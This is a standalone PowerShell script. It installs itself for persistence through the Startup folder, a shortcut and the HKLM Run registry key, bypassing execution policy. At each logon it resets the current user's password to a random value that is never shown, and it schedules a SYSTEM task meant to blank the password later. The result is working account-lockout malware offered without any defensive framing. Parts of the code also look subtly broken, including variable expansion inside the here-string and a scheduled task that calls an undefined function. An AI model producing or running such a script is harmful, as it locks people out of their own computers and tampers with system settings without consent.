# Define the path to the startup folder
$startupFolder = [System.Environment]::GetFolderPath('Startup')

# Define the path to the script
$scriptPath = "$startupFolder\PasswordChangeScript.ps1"

# Check if the script is already present in the startup folder
if (-not (Test-Path $scriptPath)) {
    # If not present, copy the script to the startup folder
    $scriptContent = @"
# Function to generate a random password
function Generate-RandomPassword {
    $chars = [char[]]('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()')
    $password = ''
    for ($i = 0; $i -lt 12; $i++) {
        $password += $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)]
    }
    return $password
}

# Function to set the user password to blank
function Reset-UserPassword {
    $username = $env:USERNAME
    $nullPassword = ConvertTo-SecureString """" -AsPlainText -Force
    Set-LocalUser -Name $username -Password $nullPassword
}

# Generate a new random password
$newPassword = Generate-RandomPassword

# Set the user password to the new random password
$securePassword = ConvertTo-SecureString -String $newPassword -AsPlainText -Force
Set-LocalUser -Name $env:USERNAME -Password $securePassword

# Schedule a task to reset password to blank after 1 second
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"Start-Sleep -Seconds 1; Reset-UserPassword`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5)
Register-ScheduledTask -TaskName "ResetPassword" -Action $action -Trigger $trigger -User "SYSTEM"

"@

    # Create the script file
    $scriptContent | Out-File -FilePath $scriptPath -Encoding utf8

    # Create a shortcut to the script in the startup folder
    $shortcutPath = "$startupFolder\PasswordChangeScript.lnk"
    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -File ""$scriptPath"""
    $shortcut.Save()
}

# Register the script to run as administrator at startup
$regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "PasswordChangeScript"
$regValue = "powershell.exe -ExecutionPolicy Bypass -File ""$scriptPath"""
New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force
